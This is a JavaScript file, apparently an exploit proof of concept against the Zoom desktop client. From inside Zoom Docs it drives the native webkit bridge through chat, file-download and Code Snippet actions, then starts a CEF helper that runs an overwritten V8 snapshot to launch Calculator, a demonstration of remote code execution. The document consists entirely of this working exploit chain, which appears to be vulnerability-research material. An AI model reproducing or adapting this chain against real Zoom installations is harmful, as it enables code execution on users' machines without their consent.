svg.script:
(async()=>{
  'use strict';
  const q=new URLSearchParams(location.search);
  const session=q.get('s'),message=q.get('m'),file=q.get('f');
  const dialog='https://zoom.us/',proof=q.get('r');
  const status=document.getElementById('status'),detail=document.getElementById('detail');
  const delay=ms=>new Promise(resolve=>setTimeout(resolve,ms));
  const setStage=stage=>{detail.textContent=stage};
  const resolveInternals=()=>{
    const seen=new Set(),queue=[self,parent,top];
    while(queue.length&&seen.size<32){
      const win=queue.shift();
      if(!win||seen.has(win))continue;
      seen.add(win);
      try{
        if(win.location.origin!=='https://docs.zoom.us')continue;
        if(typeof win.__ZM_INTERNALS__?.invoke==='function')return win.__ZM_INTERNALS__;
        for(let i=0;i<win.frames.length;i++)queue.push(win.frames[i]);
      }catch(_){}
    }
    throw new Error('Zoom native bridge was not reachable');
  };
  try{
    const parentUrl=new URL(parent.location.href);
    const helper=window.webkit?.messageHandlers?.jsOCHelper;
    if(location.origin!=='https://docs.zoom.us'||
       !location.pathname.startsWith('/api/file/')||top===self||parent!==top||
       parentUrl.origin!=='https://docs.zoom.us'||!parentUrl.pathname.startsWith('/doc/')||
       parentUrl.searchParams.get('from')!=='zoom_event_card'||
       parentUrl.searchParams.get('skipCheck')!=='1'||
       !/\bZoomDocsClient\/1\.0\.0\b/.test(navigator.userAgent)||
       typeof helper?.postMessage!=='function'||
       !/^[0-9a-f]{32}@conference\.xmpp\.zoom\.us$/i.test(session||'')||
       !/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(message||'')||
       !/^proof[0-9a-f]{32}$/.test(proof||'')){
      throw new Error('stock Calendar -> Docs/native-bridge guard failed');
    }
    const topGuard='__ZOOM_CODESNIPPET_RCE_ONESHOT_'+proof;
    if(Object.prototype.hasOwnProperty.call(top,topGuard))throw new Error('one-shot proof already ran');
    Object.defineProperty(top,topGuard,{value:true,configurable:false,enumerable:false,writable:false});
    const nativeCall=(apiName,data)=>helper.postMessage(JSON.stringify({
      jsCallId:'poc_native_'+Date.now()+'_'+Math.random().toString(16).slice(2),apiName,data
    }));
    const publish=(action,params={})=>nativeCall('zmAppBridgePub',{
      service:'chat',data:JSON.stringify({
        action,params,jsCallId:'poc_action_'+Date.now()+'_'+Math.random().toString(16).slice(2)
      })
    });

    setStage('Native bridge reached; opening the controlled channel…');
    publish('DLAct_SwitchToNativeChat',{});
    await delay(1800);
    publish('DLAct_Chat',{jid:session,forceNativeChat:true});
    await delay(15000);
    publish('DLAct_GetFileWithMsgIDAndFileIndex',{sessionId:session,msgId:message,fileIndex:0});
    await delay(1000);
    publish('DLAct_DownloadFileForMsgInSession',{
      sessionId:session,msgId:message,fileIndex:0,isRebuildConnection:false,isManual:false
    });
    setStage('Waiting for Code Snippet extraction…');
    await delay(20000);
    publish('DLAct_Chat',{jid:session,forceNativeChat:true});
    await delay(10000);
    publish('DLAct_GetCodeSnippetPreviewInfo',{sessionId:session,messageId:message});
    await delay(5000);

    const bridge=resolveInternals();
    status.textContent='Starting a fresh Zoom CEF helper…';
    setStage('The overwritten V8 snapshot runs before the page loads.');
    await bridge.invoke('unifywebview','dialog','create',{params:{
      url:dialog,title:'Controlled Calculator proof',width:620,height:460,
      isShowTitleBar:true,isAllowResize:true,featureName:'NewHomePage',forceCEF:true
    }},{timeout:30});
    setStage('Fresh CEF helper created; wait for Calculator.');
  }catch(error){
    status.textContent='Proof stopped';
    detail.textContent=String(error?.message||error);
  }
})();
